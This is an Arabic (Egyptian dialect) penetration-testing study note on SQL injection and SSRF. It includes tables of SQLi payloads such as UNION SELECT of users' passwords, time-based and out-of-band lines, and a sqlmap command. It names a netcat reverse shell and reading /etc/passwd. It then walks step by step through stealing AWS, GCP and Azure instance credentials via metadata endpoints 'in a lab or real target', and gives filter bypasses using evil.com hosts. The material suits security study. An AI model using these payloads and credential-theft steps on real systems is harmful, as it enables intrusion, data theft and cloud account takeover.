### 1. **SQL Injection (SQLi)** – أشهر ثغرة في التاريخ ولسه موجودة في 2026

**الفكرة الأساسية:**  
الموقع بياخد كلام منك (اسم مستخدم، كلمة سر، كاتيجوري منتج...) وبيحطه جوا استعلام SQL **من غير ما ينظفه**، فأنت تقدر تغير معنى الاستعلام ده وتخليه يعمل حاجات مش المفروض يعملها.

**الأضرار الممكنة:**
- تشوفي بيانات مش المفروض تشوفيها (إيميلات، باسووردات، كريدت كاردز)
- تدخلي كـ admin من غير باسوورد
- تمسحي جداول كاملة
- تكتبي/تعدلي بيانات

#### الأنواع الرئيسية (التصنيف الأشهر دلوقتي)

| النوع                   | وصف بسيط بالمصري                                             | إزاي تكتشفيها؟                                     | مثال payload بسيط                               | الخطورة      |
| ----------------------- | ------------------------------------------------------------ | -------------------------------------------------- | ----------------------------------------------- | ------------ |
| **In-band / Classic**   | النتيجة بتظهر فورًا في الصفحة أو في إيرور                    | إيرور واضح أو بيانات زيادة تظهر                    | `' OR 1=1 --` <br> `Gifts'--`                   | عالية        |
| **Error-based**         | الموقع بيرمي إيرور SQL لما تغلطيه بعلامة `'`                 | إيرور 500 + رسالة زي "You have an error..."        | `'` أو `''` أو `'`)`                            | متوسطة–عالية |
| **Union-based**         | تستخدمي `UNION` عشان تجيبي بيانات من جدول تاني               | عدد الأعمدة يتطابق + بيانات تظهر                   | `' UNION SELECT username,password FROM users--` | عالية جدًا   |
| **Blind Boolean-based** | الموقع "أخرس"، بس بيفرق في الرد (صفحة تظهر/تختفي) حسب صح/غلط | `AND 1=1` → صفحة عادية <br> `AND 1=2` → صفحة فاضية | `' AND substring(database(),1,1)='a`            | متوسطة       |
| **Blind Time-based**    | الموقع يتأخر لو الشرط صح (sleep)                             | تأخير واضح (5–10 ثواني)                            | `' AND IF(1=1, sleep(5),0)--`                   | متوسطة       |
| **Out-of-band**         | البيانات تطلع بره (DNS request، HTTP request لسيرفرك)        | تستخدمي Burp Collaborator أو سيرفرك                | `' ; SELECT LOAD_FILE(concat('\\\\',...))`      | عالية        |
| **Second-order**        | الكود يتخزن الأول (في الداتابيز) وبعدين يتنفذ في مكان تاني   | صعبة، تحتاج تخزين + استخدام لاحق                   | في تعليق أو اسم → بعدين يستخدم في استعلام       | عالية جدًا   |

**فرق Time-based SQLi عن Time-based OS Command Injection؟**  
- **SQLi Time-based** → محبوس جوا الداتابيز، بتستخرجي بيانات من الجداول (بطيء جدًا حرف حرف).
- **OS Command Injection Time-based** → خارج الداتابيز، بتنفذي أوامر نظام (whoami, cat /etc/passwd, nc reverse shell...)، أسرع وأخطر بكتير.

**خطوات سريعة لاختبار SQLi يدوي:**
1. حطي `'` أو `"` أو `)` أو `';--` في كل حقل (search, category, id, username...)
2. لو طلع إيرور SQL → Error-based → ابدئي تجمعي معلومات (version, database name...)
3. جربي `' OR '1'='1` أو `admin'--` في اللوجن → لو دخلتي → subverting logic
4. جربي `' ORDER BY 1--` → زدي الرقم لحد ما يطلع إيرور → عرفتي عدد الأعمدة
5. جربي Union: `' UNION SELECT NULL,NULL--` (عدلي عدد الـ NULL حسب عدد الأعمدة)

**أدوات أوتوماتيك:**
- **sqlmap** (الملك) → `sqlmap -u "URL" --batch --dbs`
- **Ghauri** (بديل حديث وخفيف)

### 2. **SSRF – Server-Side Request Forgery** (اللي بيخلي السيرفر يروح يزور أماكن هو مش المفروض)

**الفكرة:**  
الموقع بيسمحلك تحددي URL (fetch image, check stock, import data...)، والسيرفر بيروح يجيب الرابط ده، فأنت تقدري تخليه يروح يجيب حاجات داخلية (localhost, internal IPs) أو حتى cloud metadata.

**أنواع رئيسية:**
1. **Basic SSRF** → يجيبلك صفحة داخلية (مثل `/admin` على localhost)
   - Payload: `http://127.0.0.1/admin` أو `http://localhost:8080`

2. **Blind SSRF** → مفيش رد مرئي، بس تقدري تثبتيها إن السيرفر عمل ريكويست
   - استخدمي **Burp Collaborator** أو domain بتاعك → `http://your-id.oastify.com`
   - لو لقيتي interaction → SSRF مؤكد

3. **SSRF to cloud metadata** (الأشهر في 2025–2026)
   - AWS: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
   - GCP: `http://metadata.google.internal/computeMetadata/v1/`
   - Azure: `http://169.254.169.254/metadata/instance`

### الفكرة الأساسية: إيه الـ Cloud Metadata Service ده؟
لما الشركة تشغل سيرفر (VM أو instance) على AWS أو GCP أو Azure، السيرفر ده محتاج يعرف معلومات عن نفسه زي:
- اسم الـ instance
- الـ region
- الـ IAM role / service account المرتبط بيه
- **أهم حاجة: Temporary credentials** (Access Key + Secret Key + Token) عشان يقدر يعمل حاجات زي رفع ملفات على S3، قراءة secrets من Secret Manager، أو التحكم في موارد تانية في الحساب.

المعلومات دي كلها موجودة في خدمة داخلية اسمها **Instance Metadata Service (IMDS)**، وبتكون متاحة **فقط من داخل الـ VM** على IP خاص مش بيروح بره السيرفر (link-local IP).

الـ IP ده ثابت في كل الـ clouds الرئيسية:

| الـ Cloud     | الـ IP الرئيسي                  | الـ Endpoint الأساسي للـ Metadata                          | اللي بيطلع منه أهم حاجة (Credentials)                                                                 | Header مطلوب (غالباً)          |
|---------------|----------------------------------|-------------------------------------------------------------|----------------------------------------------------------------------------------------------------------|---------------------------------|
| **AWS**       | 169.254.169.254                 | http://169.254.169.254/latest/meta-data/                    | /iam/security-credentials/<role-name>                                                                   | X-aws-ec2-metadata-token (IMDSv2) |
| **GCP**       | metadata.google.internal أو 169.254.169.254 | http://metadata.google.internal/computeMetadata/v1/         | /instance/service-accounts/default/token                                                                | Metadata-Flavor: Google         |
| **Azure**     | 169.254.169.254                 | http://169.254.169.254/metadata/instance?api-version=...   | /metadata/identity/oauth2/token?api-version=...&resource=...                                            | Metadata: true                  |

### ليه الثغرة دي خطيرة جدًا؟
لو SSRF نجح ووصل للـ metadata endpoint ده، تقدري تسحبي **temporary credentials** (مفتاح مؤقت) للـ IAM role اللي مرفق مع الـ VM.

الـ role ده ممكن يكون له صلاحيات كبيرة جدًا:
- S3 Full Access → تسرقي كل البيانات في الـ buckets
- Secrets Manager / Parameter Store → تسحبي كل الأسرار (API keys, DB passwords...)
- EC2/ECS/GKE admin → تعملي instances جديدة، تمسحي موارد...
- في أحسن الحالات: **full account takeover** لو الـ role له AdministratorAccess أو صلاحيات حساسة.

### كيف تستغليها خطوة بخطوة (في SSRF lab أو real target)

1. **اكتشفي إن في SSRF**  
   جربي payloads زي `http://127.0.0.1/` أو `http://localhost/` أو `http://169.254.169.254/`  
   لو رجع محتوى (حتى لو error 403 أو صفحة داخلية) → تمام.

2. **جربي الـ metadata endpoints**  
   ابدئي بالـ root عشان تشوفي إيه اللي متاح:

   - AWS: `http://169.254.169.254/latest/meta-data/`
     - هتلاقي قائمة زي: ami-id, hostname, iam/, instance-id, public-ipv4...

   - GCP: `http://metadata.google.internal/computeMetadata/v1/`
     أو `http://169.254.169.254/computeMetadata/v1/`

   - Azure: `http://169.254.169.254/metadata/instance?api-version=2025-04-07`

3. **سحب الـ credentials**  
   - **AWS (IMDSv1 – الأسهل، لو لسه مفعل):**
     ```
     http://169.254.169.254/latest/meta-data/iam/security-credentials/
     → يرجعلك اسم الـ role (مثلاً: EC2S3FullAccessRole)

     http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2S3FullAccessRole
     → يرجعلك JSON زي:
     {
       "AccessKeyId": "ASIA...",
       "SecretAccessKey": "xxxx...",
       "Token": "xxxx..."
     }
     ```

   - **AWS IMDSv2 (الأكثر أمانًا، لكن لو SSRF قوي ممكن تتخطيه أحيانًا):**
     تحتاجي token أولاً (PUT request)، ثم تستخدميه في GET.  
     في SSRF صعب شوية لأن معظم الـ SSRF بيسمح GET بس، لكن لو في open redirect أو طريقة bypass، ممكن.

   - **GCP:**
     ```
     http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
     → يرجعلك access_token صالح لفترة (عادة ساعة)

     http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity?audience=https://example.com
     → identity token (JWT)
     ```

   - **Azure:**
     ```
     http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
     → يرجعلك access_token للـ Azure Resource Manager
     ```

4. **بعد ما تسحبي الـ creds، إيه اللي تعمليه؟**  
   - تستخدمي aws cli / gcloud / az cli (مع الـ creds الجديدة) عشان تثبتي الـ takeover.
   - أمثلة:
     - `aws s3 ls` → تشوفي الـ buckets
     - `aws secretsmanager list-secrets`
     - `gcloud projects list`
     - `az vm list`

**bypass الـ filters :**

| الدفاع                           | Bypass شائع                                                                                     |
| -------------------------------- | ----------------------------------------------------------------------------------------------- |
| Blacklist (127.0.0.1, localhost) | `127.1` , `2130706433` , `0177.0.0.1` , `0.0.0.0` , `[::1]` , domain spoof                      |
| Whitelist (only allowed.com)     | `allowed.com.evil.com` , `allowed.com@evil.com` , `#@evil.com` , `http://allowed.com#@evil.com` |
| Open Redirect موجود              | `https://allowed.com/redirect?url=http://169.254.169.254`                                       |
| Case / encoding                  | `LoCaLhOsT` , `%6c%6f%63%61%6c%68%6f%73%74`                                                     |

**أماكن شائعة تلاقي SSRF فيها:**
- Image fetch / avatar upload
- Stock check / price import
- Webhook / ping URL
- PDF generator / screenshot tool
- Referer header analytics
- XML / JSON external entity (XXE → SSRF)

**نصيحة عملية:**
- ابدئي دايمًا بـ `http://127.0.0.1` ثم `http://localhost` ثم `http://[::1]`
- لو Blind → ارفعي Burp Collaborator وجربي domain بتاعه
- لو لقيتي cloud → روحي على metadata endpoints فورًا (غالباً jackpot)

And Done :)